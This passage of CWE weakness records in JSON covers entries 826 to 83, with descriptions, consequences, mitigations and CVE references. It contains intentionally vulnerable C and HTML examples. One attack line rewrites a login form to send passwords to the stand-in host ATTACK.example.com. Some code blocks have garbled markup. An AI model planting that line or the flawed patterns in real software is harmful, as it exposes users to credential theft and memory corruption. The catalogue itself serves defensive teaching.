{"ID": "826", "Name": "Premature Release of Resource During Expected Lifetime", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product releases a resource that is still intended to be used by itself or another actor.", "ExtendedDescription": "\n\nThis weakness focuses on errors in which the product should not release a resource, but performs the release anyway. This is different than a weakness in which the product releases a resource at the appropriate time, but it maintains a reference to the resource, which it later accesses. For this weakness, the resource should still be valid upon the subsequent access.\n\n\nWhen a product releases a resource that is still being used, it is possible that operations will still be taken on this resource, which may have been repurposed in the meantime, leading to issues similar to CWE-825. Consequences may include denial of service, information exposure, or code execution.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "666", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "672", "ViewID": "1000"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data", "Read Memory"], "Note": "If the released resource is subsequently reused or reallocated, then a read operation on the original resource might access sensitive data that is associated with a different user or entity."}, {"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "When the resource is released, the software might modify some of its structure, or close associated channels (such as a file descriptor). When the software later accesses the resource as if it is valid, the resource might not be in an expected state, leading to resultant errors that may lead to a crash."}, {"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands", "Modify Application Data", "Modify Memory"], "Note": "When the resource is released, the software might modify some of its structure. This might affect logic in the sections of code that still assume the resource is active. If the released resource is related to memory and is used in a function call, or points to unexpected data in a write operation, then code execution may be possible upon subsequent accesses."}], "ObservedExamples": [{"Reference": "CVE-2009-3547", "Description": "Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476)", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3547"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Research Gap", "Note": "Under-studied and under-reported as of September 2010. This weakness has been reported in high-visibility software, although the focus has been primarily on memory allocation and de-allocation. There are very few examples of this weakness that are not directly related to memory management, although such weaknesses are likely to occur in real-world software for other types of resources."}], "Top25Examples": [{"Reference": "CVE-2022-27499", "Description": "Premature release of resource during expected lifetime in the Intel(R) SGX SDK software may allow a privileged user to potentially enable information disclosure via local access."}]}
{"ID": "827", "Name": "Improper Control of Document Type Definition", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the product to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker.", "ExtendedDescription": "\n\nAs DTDs are processed, they might try to read or include files on the machine performing the parsing. If an attacker is able to control the DTD, then the attacker might be able to specify sensitive resources or requests or provide malicious content.\n\n\nFor example, the SOAP specification prohibits SOAP messages from containing DTDs.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "706", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "829", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "776", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "XML", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Files or Directories"], "Note": "If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system."}, {"Scope": ["Availability"], "Impact": ["DoS: Resource Consumption (CPU)", "DoS: Resource Consumption (Memory)"], "Note": "The DTD may cause the parser to consume excessive CPU cycles or memory using techniques such as nested or recursive entity references (CWE-776)."}, {"Scope": ["Integrity", "Confidentiality", "Availability", "Access Control"], "Impact": ["Execute Unauthorized Code or Commands", "Gain Privileges or Assume Identity"], "Note": "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."}], "ObservedExamples": [{"Reference": "CVE-2010-2076", "Description": "Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2076"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "828", "Name": "Signal Handler with Functionality that is not Asynchronous-Safe", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product defines a signal handler that contains code sequences that are not asynchronous-safe, i.e., the functionality is not reentrant, or it can be interrupted.", "ExtendedDescription": "\n\nThis can lead to an unexpected system state with a variety of potential consequences depending on context, including denial of service and code execution.\n\n\nSignal handlers are typically intended to interrupt normal functionality of a program, or even other signals, in order to notify the process of an event. When a signal handler uses global or static variables, or invokes functions that ultimately depend on such state or its associated metadata, then it could corrupt system state that is being used by normal functionality. This could subject the program to race conditions or other weaknesses that allow an attacker to cause the program state to be corrupted. While denial of service is frequently the consequence, in some cases this weakness could be leveraged for code execution.\n\n\nThere are several different scenarios that introduce this issue:\n\n\n  - Invocation of non-reentrant functions from within the handler. One example is malloc(), which modifies internal global variables as it manages memory. Very few functions are actually reentrant.\n\n  - Code sequences (not necessarily function calls) contain non-atomic use of global variables, or associated metadata or structures, that can be accessed by other functionality of the program, including other signal handlers. Frequently, the same function is registered to handle multiple signals.\n\n  - The signal handler function is intended to run at most one time, but instead it can be invoked multiple times. This could happen by repeated delivery of the same signal, or by delivery of different signals that have the same handler function (CWE-831).\n\nNote that in some environments or contexts, it might be possible for the signal handler to be interrupted itself.\n\nIf both a signal handler and the normal behavior of the product have to operate on the same set of state variables, and a signal is received in the middle of the normal execution's modifications of those variables, the variables may be in an incorrect or corrupt state during signal handler execution, and possibly still incorrect or corrupt upon return.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "364", "ViewID": "1000", "Ordinal": "Primary"}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["DoS: Crash, Exit, or Restart", "Execute Unauthorized Code or Commands"], "Note": "The most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure."}], "PotentialMitigations": [{"Phase": ["Implementation", "Architecture and Design"], "Description": "\n\nEliminate the usage of non-reentrant functionality inside of signal handlers. This includes replacing all non-reentrant library calls with reentrant calls.\n\n\nNote: This will not always be possible and may require large portions of the product to be rewritten or even redesigned. Sometimes reentrant-safe library alternatives will not be available. Sometimes non-reentrant interaction between the state of the system and the signal handler will be required by design.\n", "Effectiveness": "High"}, {"Phase": ["Implementation"], "Description": "Where non-reentrant functionality must be leveraged within a signal handler, be sure to block or mask signals appropriately. This includes blocking other signals within the signal handler itself that may also leverage the functionality. It also includes blocking all signals reliant upon the functionality when it is being accessed or modified by the normal behaviors of the product."}], "DemonstrativeExamples": [{"ID": "DX-26", "Entries": [{"IntroText": "This code registers the same signal handler function with two different signals (CWE-831). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar *logMessage;\n\tvoid handler (int sigNum) {\n\t\t\tsyslog(LOG_NOTICE, \"%s\\n\", logMessage);\n\t\t\tfree(logMessage);\n```\n/* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}\n\t\n\tint main (int argc, char* argv[]) {\n\t```\n\t\t\tlogMessage = strdup(argv[1]);\n```\n/* Register signal handlers. */* \n\t\t\t\n\t\t\tsignal(SIGHUP, handler);\n\t\t\tsignal(SIGTERM, handler);\n\t\t\t\n\t\t\t */* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);}"}, {"BodyText": "The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines:"}, {"BodyText": "- The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM.\n\n  - The program begins its \"normal\" functionality, which is simplified as sleep(), but could be any functionality that consumes some time.\n\n  - The attacker sends SIGHUP, which invokes handler (call this \"SIGHUP-handler\").\n\n  - SIGHUP-handler begins to execute, calling syslog().\n\n  - syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap.\n\n  - The attacker then sends SIGTERM.\n\n  - SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.\n\n  - The SIGTERM handler is invoked.\n\n  - SIGTERM-handler records the log message using syslog(), then frees the logMessage variable."}, {"BodyText": "At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running."}, {"BodyText": "Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [REF-360]; the original example was shown to be exploitable for code execution."}, {"BodyText": "Also note that the strdup(argv[1]) call contains a potential buffer over-read (CWE-126) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array."}]}, {"ID": "DX-48", "Entries": [{"IntroText": "The following code registers a signal handler with multiple signals in order to log when a specific event occurs and to free associated memory before exiting."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t#include <signal.h>\n\t#include <syslog.h>\n\t#include <string.h>\n\t#include <stdlib.h>\n\tvoid *global1, *global2;\n\tchar *what;\n\tvoid sh (int dummy) {\n\t\t\tsyslog(LOG_NOTICE,\"%s\\n\",what);\n\t\t\tfree(global2);\n\t\t\tfree(global1);\n```\n/* Sleep statements added to expand timing window for race condition */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}\n\t\n\tint main (int argc,char* argv[]) {\n\t```\n\t\t\twhat=argv[1];\n\t\t\tglobal1=strdup(argv[2]);\n\t\t\tglobal2=malloc(340);\n\t\t\tsignal(SIGHUP,sh);\n\t\t\tsignal(SIGTERM,sh);\n```\n/* Sleep statements added to expand timing window for race condition */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}"}, {"BodyText": "However, the following sequence of events may result in a double-free (CWE-415):"}, {"BodyText": "1. a SIGHUP is delivered to the process\n\n  1. sh() is invoked to process the SIGHUP\n\n  1. This first invocation of sh() reaches the point where global1 is freed\n\n  1. At this point, a SIGTERM is sent to the process\n\n  1. the second invocation of sh() might do another free of global1\n\n  1. this results in a double-free (CWE-415)"}, {"BodyText": "This is just one possible exploitation of the above code. As another example, the syslog call may use malloc calls which are not async-signal safe. This could cause corruption of the heap management structures. For more details, consult the example within \"Delivering Signals for Fun and Profit\" [REF-360]."}]}], "ObservedExamples": [{"Reference": "CVE-2008-4109", "Description": "Signal handler uses functions that ultimately call the unsafe syslog/malloc/s*printf, leading to denial of service via multiple login attempts", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4109"}, {"Reference": "CVE-2006-5051", "Description": "Chain: Signal handler contains too much functionality (CWE-828), introducing a race condition (CWE-362) that leads to a double free (CWE-415).", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5051"}, {"Reference": "CVE-2001-1349", "Description": "unsafe calls to library functions from signal handler", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1349"}, {"Reference": "CVE-2004-0794", "Description": "SIGURG can be used to remotely interrupt signal handler; other variants exist.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0794"}, {"Reference": "CVE-2004-2259", "Description": "SIGCHLD signal to FTP server can cause crash under heavy load while executing non-reentrant functions like malloc/free.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2259"}, {"Reference": "CVE-2002-1563", "Description": "SIGCHLD not blocked in a daemon loop while counter is modified, causing counter to get out of sync.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1563"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "829", "Name": "Inclusion of Functionality from Untrusted Control Sphere", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.", "ExtendedDescription": "\n\nWhen including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.\n\n\nThis might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "669", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "669", "ViewID": "1003", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site."}], "DetectionMethods": [{"Method": "Automated Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tForced Path Execution\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source", "Effectiveness": "High"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "SOAR Partial"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAttack Modeling", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-4", "Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid."}, {"MitigationID": "MIT-21.1", "Phase": ["Architecture and Design"], "Strategy": "Enforcement by Conversion", "Description": "\n\nWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.\n\n\nFor example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.\n"}, {"MitigationID": "MIT-15", "Phase": ["Architecture and Design"], "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."}, {"MitigationID": "MIT-22", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Sandbox or Jail", "Description": "\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n", "Effectiveness": "Limited", "EffectivenessNotes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."}, {"MitigationID": "MIT-17", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Environment Hardening", "Description": "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."}, {"MitigationID": "MIT-5.1", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nWhen validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.\n\n\nDo not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string.\n", "Effectiveness": "High"}, {"MitigationID": "MIT-34", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Attack Surface Reduction", "Description": "\n\nStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.\n\n\nThis significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.\n"}, {"MitigationID": "MIT-6", "Phase": ["Architecture and Design", "Implementation"], "Strategy": "Attack Surface Reduction", "Description": "\n\nUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.\n\n\nMany file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.\n"}, {"MitigationID": "MIT-29", "Phase": ["Operation"], "Strategy": "Firewall", "Description": "Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.", "Effectiveness": "Moderate", "EffectivenessNotes": "An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."}], "DemonstrativeExamples": [{"ID": "DX-94", "Entries": [{"IntroText": "This login webpage includes a weather widget from an external website:"}, {"Nature": "Bad", "Language": "HTML", "ExampleCode": "```\n\t<div class=\"header\"> Welcome!\n\t\t<div id=\"loginBox\">Please Login:\n\t\t\t<form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\">\n\t\t\tUsername: <input type=\"text\" name=\"username\" />\n\t\t\t<br/>\n\t\t\tPassword: <input type=\"password\" name=\"password\" />\n\t\t\t<input type=\"submit\" value=\"Login\" />\n\t\t\t</form>\n\t\t</div>\n\t\t<div id=\"WeatherWidget\">\n\t\t\t<script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script>\n\t\t</div>\n\t</div>\n```"}, {"BodyText": "This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79)."}, {"BodyText": "For example, user login information could easily be stolen with a single line added to weatherwidget.js:"}, {"Nature": "Attack", "Language": "JavaScript", "ExampleCode": "```\n```\n...Weather widget code....* \n\tdocument.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";"}, {"BodyText": "This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site."}]}], "ObservedExamples": [{"Reference": "CVE-2010-2076", "Description": "Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2076"}, {"Reference": "CVE-2004-0285", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0285"}, {"Reference": "CVE-2004-0030", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0030"}, {"Reference": "CVE-2004-0068", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0068"}, {"Reference": "CVE-2005-2157", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2157"}, {"Reference": "CVE-2005-2162", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2162"}, {"Reference": "CVE-2005-2198", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2198"}, {"Reference": "CVE-2004-0128", "Description": "Modification of assumed-immutable variable in configuration script leads to file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0128"}, {"Reference": "CVE-2005-1864", "Description": "PHP file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1864"}, {"Reference": "CVE-2005-1869", "Description": "PHP file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1869"}, {"Reference": "CVE-2005-1870", "Description": "PHP file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1870"}, {"Reference": "CVE-2005-2154", "Description": "PHP local file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2154"}, {"Reference": "CVE-2002-1704", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1704"}, {"Reference": "CVE-2002-1707", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1707"}, {"Reference": "CVE-2005-1964", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1964"}, {"Reference": "CVE-2005-1681", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1681"}, {"Reference": "CVE-2005-2086", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2086"}, {"Reference": "CVE-2004-0127", "Description": "Directory traversal vulnerability in PHP include statement.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0127"}, {"Reference": "CVE-2005-1971", "Description": "Directory traversal vulnerability in PHP include statement.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1971"}, {"Reference": "CVE-2005-3335", "Description": "PHP file inclusion issue, both remote and local; local include uses \"..\" and \"%00\" characters as a manipulation, but many remote file inclusion issues probably have this vector.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3335"}], "RelatedAttackPatterns": ["175", "201", "228", "251", "252", "253", "263", "538", "549", "640", "660", "695", "698"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-31156", "Description": "Gradle is a build tool. Dependency verification is a security feature in Gradle Build Tool that was introduced to allow validation of external dependencies either through their checksum or cryptographic signatures. In versions 6.2 through 7.4.2, there are some cases in which Gradle may skip that verification and accept a dependency that would otherwise fail the build as an untrusted external artifact. This can occur in two ways. When signature verification is disabled but the verification metadata contains entries for dependencies that only have a `gpg` element but no `checksum` element. When signature verification is enabled, the verification metadata contains entries for dependencies with a `gpg` element but there is no signature file on the remote repository. In both cases, the verification will accept the dependency, skipping signature verification and not complaining that the dependency has no checksum entry. For builds that are vulnerable, there are two risks. Gradle could download a malicious binary from a repository outside your organization due to name squatting. For those still using HTTP only and not HTTPS for downloading dependencies, the build could download a malicious library instead of the expected one. Gradle 7.5 patches this issue by making sure to run checksum verification if signature verification cannot be completed, whatever the reason. Two workarounds are available: Remove all `gpg` elements from dependency verification metadata if you disable signature validation and/or avoid adding `gpg` entries for dependencies that do not have signature files."}]}
{"ID": "83", "Name": "Improper Neutralization of Script in Attributes in a Web Page", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product does not neutralize or incorrectly neutralizes \"javascript:\" or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "79", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Read Application Data", "Execute Unauthorized Code or Commands"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended."}, {"MitigationID": "MIT-30.1", "Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "\n\nUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.\n\n\nThe problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.\n"}, {"MitigationID": "MIT-43", "Phase": ["Implementation"], "Description": "With Struts, write all data from form beans with the bean's filter attribute set to true."}, {"MitigationID": "MIT-31", "Phase": ["Implementation"], "Strategy": "Attack Surface Reduction", "Description": "To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In 